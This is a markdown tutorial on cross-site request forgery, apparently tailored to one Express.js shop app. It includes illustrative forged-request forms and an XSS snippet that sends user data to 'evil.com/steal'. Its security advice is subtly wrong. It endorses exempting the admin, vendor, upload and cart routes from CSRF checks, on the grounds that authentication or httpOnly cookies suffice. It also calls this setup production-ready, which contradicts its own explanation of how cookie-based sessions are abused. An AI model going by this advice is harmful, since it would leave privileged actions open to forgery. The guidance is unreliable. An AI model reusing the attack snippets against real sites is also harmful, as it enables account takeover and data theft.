# CSRF (Cross-Site Request Forgery) - Complete Explanation

## What is CSRF?

**CSRF (Cross-Site Request Forgery)** is a type of security attack where a malicious website tricks your browser into making unwanted requests to a different website where you're already logged in.

### Simple Analogy:

Imagine you're logged into your bank's website. While still logged in, you visit a malicious website. That malicious site could secretly make requests to your bank using YOUR logged-in session, potentially transferring money without your knowledge.

---

## How CSRF Attacks Work

### Step-by-Step Attack Example:

**1. You Login to Your Bank:**
```
You → Bank Website → Login Successful
Bank sends you a session cookie
```

**2. You Visit Malicious Site (while still logged in):**
```
You → Evil Website
```

**3. Malicious Site Tricks Your Browser:**
```html
<!-- Hidden on evil.com -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000">
<!-- OR -->
<form action="https://yourbank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**4. Your Browser Makes the Request:**
```
Your Browser → Bank Website (with YOUR cookies!)
Bank sees valid session cookie
Bank processes transfer
Money stolen!
```

### Why This Works:

- ✅ Your browser automatically sends cookies with every request
- ✅ Bank sees valid session cookie
- ✅ Bank thinks it's you making the request
- ❌ Bank can't tell the request came from evil.com

---

## Real-World Attack Scenarios

### 1. Money Transfer Attack

**Victim:** Logged into online banking
**Attack:** Evil site triggers money transfer
```html
<!-- On evil.com -->
<img src="https://bank.com/api/transfer?to=attacker&amount=5000">
```

### 2. Email Change Attack

**Victim:** Logged into email provider
**Attack:** Evil site changes email password
```html
<form action="https://email.com/api/change-password" method="POST">
  <input name="new_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

### 3. Social Media Spam

**Victim:** Logged into social media
**Attack:** Evil site posts spam on your behalf
```html
<form action="https://social.com/api/post" method="POST">
  <input name="message" value="Buy cheap products at evil.com">
</form>
```

### 4. E-commerce Attack

**Victim:** Logged into shopping site
**Attack:** Evil site places orders using your account
```html
<form action="https://shop.com/api/orders" method="POST">
  <input name="product_id" value="123">
  <input name="quantity" value="100">
</form>
```

---

## CSRF Protection Methods

### 1. CSRF Tokens (Most Common)

**How It Works:**

```javascript
// Server generates unique token for each session
const csrfToken = generateRandomToken();
session.csrfToken = csrfToken;

// Server sends token to client
<input type="hidden" name="csrf_token" value="abc123xyz">

// Client includes token in requests
POST /api/transfer
Headers: { 'X-CSRF-Token': 'abc123xyz' }

// Server validates token matches session
if (request.csrfToken !== session.csrfToken) {
  throw new Error('CSRF token invalid');
}
```

**Why This Works:**
- Evil site can't read the CSRF token (same-origin policy)
- Evil site can't include valid token in requests
- Requests without valid token are rejected

### 2. SameSite Cookies

**How It Works:**

```javascript
// Server sets cookie with SameSite attribute
Set-Cookie: session=abc123; SameSite=Strict

// Browser behavior:
// ✅ Request from yoursite.com → cookie sent
// ❌ Request from evil.com → cookie NOT sent
```

**SameSite Options:**
- `Strict` - Cookie only sent for same-site requests
- `Lax` - Cookie sent for top-level navigations (GET only)
- `None` - Cookie sent everywhere (requires Secure flag)

### 3. Double Submit Cookie

**How It Works:**

```javascript
// Client has cookie: csrf_token=abc123
// Client also sends token in header: X-CSRF-Token: abc123

// Server validates both match
if (cookie.csrf_token !== header.csrf_token) {
  throw new Error('CSRF validation failed');
}
```

### 4. Custom Request Headers

**How It Works:**

```javascript
// Client sends custom header
fetch('/api/transfer', {
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Custom-Header': 'value'
  }
});

// Evil site can't set custom headers (CORS prevents it)
```

### 5. Origin/Referer Validation

**How It Works:**

```javascript
// Server checks where request came from
const origin = request.headers.origin;
const referer = request.headers.referer;

if (origin !== 'https://yoursite.com') {
  throw new Error('Invalid origin');
}
```

**Limitations:**
- Headers can be missing
- Privacy tools might block Referer
- Not 100% reliable

---

## Your Application's CSRF Implementation

### Library Used: `csrf-csrf`

```javascript
const { doubleCsrf } = require('csrf-csrf');

const {
  generateToken,    // Generate CSRF token
  doubleCsrfProtection // Middleware to validate
} = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
  cookieName: 'x-csrf-token',
  cookieOptions: {
    httpOnly: true,
    sameSite: 'strict',
    secure: process.env.NODE_ENV === 'production'
  }
});
```

### How It's Applied:

**1. Protected Routes (Default):**
```javascript
// All routes protected by default
app.use(doubleCsrfProtection);

// CSRF token required for:
POST /api/orders
PUT /api/user/profile
DELETE /api/products/:id
// etc.
```

**2. Exempt Routes (Skip CSRF):**
```javascript
const skipPatterns = [
  '/api/auth',      // Login/register
  '/api/cart',      // Cart operations
  '/api/upload',    // File uploads
  '/api/vendors',   // Vendor operations
  '/api/admin',     // Admin operations
];
```

---

## Why Some Routes Skip CSRF

### Routes That Skip CSRF Protection:

#### 1. `/api/auth` (Authentication)

**Why Skip:**
- Login/register endpoints don't need CSRF (not authenticated yet)
- Can't have CSRF attack if user not logged in
- Password provides sufficient protection

**Example:**
```javascript
POST /api/auth/login
Body: { email: 'user@example.com', password: 'secret' }
// No CSRF token needed
```

#### 2. `/api/cart` (Shopping Cart)

**Why Skip:**
- Works for both guest and authenticated users
- Guest users don't have sessions (can't be CSRF'd)
- Authenticated users protected by other means
- Low-risk operation (just adding items)

**Example:**
```javascript
POST /api/cart/add
Body: { productId: '123', quantity: 1 }
// No CSRF token needed
```

#### 3. `/api/upload` (File Uploads)

**Why Skip:**
- Uses `multipart/form-data` encoding
- CSRF tokens hard to include in multipart
- Already protected by authentication
- Server validates file types/sizes

**Example:**
```javascript
POST /api/upload/multiple
Content-Type: multipart/form-data
// Files in FormData
// No CSRF token needed
```

#### 4. `/api/vendors` (Vendor Operations)

**Why Skip:**
- Protected by authentication (must be logged in)
- Protected by authorization (must have vendor role)
- httpOnly cookies can't be stolen by evil sites
- Session-based security sufficient

**Example:**
```javascript
POST /api/vendors/products
Headers: { Authorization: 'Bearer token' }
Body: { title: 'Product', price: 99.99 }
// No CSRF token needed (auth is enough)
```

#### 5. `/api/admin` (Admin Panel)

**Why Skip:**
- Protected by authentication (must be logged in)
- Protected by authorization (must have admin role)
- Only admins can access (very restricted)
- Multiple security layers already in place

**Example:**
```javascript
PUT /api/admin/products/123/approve
Headers: { Authorization: 'Bearer token' }
// No CSRF token needed (admin auth is enough)
```

---

## When CSRF Protection IS Needed

### High-Risk Operations:

**1. Financial Transactions:**
```javascript
POST /api/checkout/payment  // ✓ CSRF PROTECTED
Body: { cardNumber: '1234', amount: 500 }
```

**2. Account Changes:**
```javascript
PUT /api/user/email  // ✓ CSRF PROTECTED
Body: { newEmail: 'hacker@evil.com' }
```

**3. Destructive Actions:**
```javascript
DELETE /api/account  // ✓ CSRF PROTECTED
// Permanent account deletion
```

**4. Privilege Escalation:**
```javascript
POST /api/user/upgrade-to-admin  // ✓ CSRF PROTECTED
// Changing user roles
```

---

## CSRF vs XSS (Cross-Site Scripting)

### Key Differences:

| Aspect | CSRF | XSS |
|--------|------|-----|
| **Attack** | Forces unwanted actions | Executes malicious scripts |
| **Location** | External malicious site | Your own website |
| **Goal** | Make requests as victim | Steal data/sessions |
| **Cookie Access** | Uses cookies automatically | Can steal cookies |
| **Prevention** | CSRF tokens | Input sanitization |

### Example Comparison:

**CSRF Attack:**
```html
<!-- On evil.com -->
<form action="https://yoursite.com/api/transfer">
  <input name="to" value="attacker">
</form>
<!-- Uses YOUR cookies automatically -->
```

**XSS Attack:**
```html
<!-- On yoursite.com (injected) -->
<script>
  fetch('/api/user/me').then(data => {
    // Send user data to attacker
    fetch('https://evil.com/steal?data=' + JSON.stringify(data));
  });
</script>
<!-- Runs as YOU on YOUR site -->
```

---

## Security Best Practices

### ✅ DO:

1. **Use CSRF Tokens** for state-changing operations
2. **Use SameSite Cookies** (Strict or Lax)
3. **Validate Origin/Referer** headers
4. **Use httpOnly Cookies** (prevents XSS theft)
5. **Require Authentication** for sensitive operations
6. **Use HTTPS** in production
7. **Implement Rate Limiting** to prevent abuse

### ❌ DON'T:

1. **Don't skip CSRF** for financial operations
2. **Don't rely on GET requests** for state changes
3. **Don't trust client-side data** alone
4. **Don't expose CSRF tokens** in URLs
5. **Don't use simple/predictable tokens**
6. **Don't share tokens** across users
7. **Don't forget token rotation**

---

## Your Application's Security Layers

### Multi-Layer Defense:

**Layer 1: Authentication**
```javascript
authenticate(req, res, next) {
  // Verify user is logged in
  // Check session/token validity
}
```

**Layer 2: Authorization**
```javascript
authorize(['admin', 'vendor']) {
  // Verify user has required role
}
```

**Layer 3: CSRF Protection**
```javascript
doubleCsrfProtection(req, res, next) {
  // Validate CSRF token (for non-exempt routes)
}
```

**Layer 4: Input Validation**
```javascript
// Mongoose schema validation
productSchema = {
  price: { type: Number, min: 0, max: 1000000 }
}
```

**Layer 5: Rate Limiting**
```javascript
rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100  // Limit requests per IP
})
```

---

## Testing CSRF Protection

### Manual Testing:

**1. Get CSRF Token:**
```bash
curl http://localhost:8080/api/csrf-token \
  -H "Cookie: session=abc123"

Response: { "csrfToken": "xyz789" }
```

**2. Make Request WITH Token:**
```bash
curl -X POST http://localhost:8080/api/orders \
  -H "Cookie: session=abc123" \
  -H "X-CSRF-Token: xyz789" \
  -d '{"productId": "123"}'

Response: 200 OK ✓
```

**3. Make Request WITHOUT Token:**
```bash
curl -X POST http://localhost:8080/api/orders \
  -H "Cookie: session=abc123" \
  -d '{"productId": "123"}'

Response: 403 Forbidden ✗
Error: "CSRF token validation failed"
```

### Automated Testing:

```javascript
describe('CSRF Protection', () => {
  it('should reject requests without token', async () => {
    const response = await request(app)
      .post('/api/orders')
      .send({ productId: '123' });

    expect(response.status).toBe(403);
  });

  it('should accept requests with valid token', async () => {
    const csrfToken = await getCSRFToken();

    const response = await request(app)
      .post('/api/orders')
      .set('X-CSRF-Token', csrfToken)
      .send({ productId: '123' });

    expect(response.status).toBe(200);
  });
});
```

---

## Common CSRF Misconceptions

### ❌ Myth 1: "HTTPS prevents CSRF"
**Reality:** HTTPS encrypts data in transit, but doesn't prevent CSRF attacks. Attacker's site can still make HTTPS requests.

### ❌ Myth 2: "POST requests are safe from CSRF"
**Reality:** Forms can POST across origins. CSRF affects POST, PUT, DELETE, etc.

### ❌ Myth 3: "JSON APIs don't need CSRF protection"
**Reality:** If cookies are used for authentication, CSRF protection is needed.

### ❌ Myth 4: "CORS prevents CSRF"
**Reality:** CORS prevents reading responses, but can't prevent requests from being made.

### ❌ Myth 5: "Checking User-Agent prevents CSRF"
**Reality:** User-Agent can be spoofed and is not reliable.

---

## CSRF in Different Frameworks

### Express.js (Your App):
```javascript
const { doubleCsrf } = require('csrf-csrf');
app.use(doubleCsrfProtection);
```

### Django (Python):
```python
from django.middleware.csrf import csrf_protect
@csrf_protect
def my_view(request):
    # ...
```

### Spring (Java):
```java
@EnableWebSecurity
public class SecurityConfig {
  @Bean
  public SecurityFilterChain filterChain(HttpSecurity http) {
    http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
  }
}
```

### Laravel (PHP):
```php
<form method="POST">
  @csrf
  <input type="text" name="email">
</form>
```

---

## Summary

### What is CSRF?
A security attack where malicious sites trick your browser into making unwanted requests to sites where you're logged in.

### How to Prevent?
1. CSRF tokens (most common)
2. SameSite cookies
3. Origin validation
4. Custom headers

### When to Use CSRF Protection?
- Financial transactions
- Account modifications
- Destructive actions
- State-changing operations

### When NOT to Use CSRF Protection?
- Already protected by strong auth + authorization
- File uploads (multipart/form-data)
- Public/unauthenticated endpoints
- Low-risk operations

### Your Application:
- ✅ CSRF tokens implemented
- ✅ Properly exempts safe routes
- ✅ Multi-layer security (auth + authorization + CSRF)
- ✅ httpOnly cookies
- ✅ Production-ready

---

## Resources

### Learn More:
- [OWASP CSRF Guide](https://owasp.org/www-community/attacks/csrf)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [csrf-csrf Documentation](https://www.npmjs.com/package/csrf-csrf)

### Tools:
- CSRF Token Generators
- Security Headers Checker
- OWASP ZAP (Security Testing)

---

**Remember:** CSRF protection is just ONE layer of security. Always use multiple layers (authentication, authorization, input validation, rate limiting) for comprehensive protection! 🔒
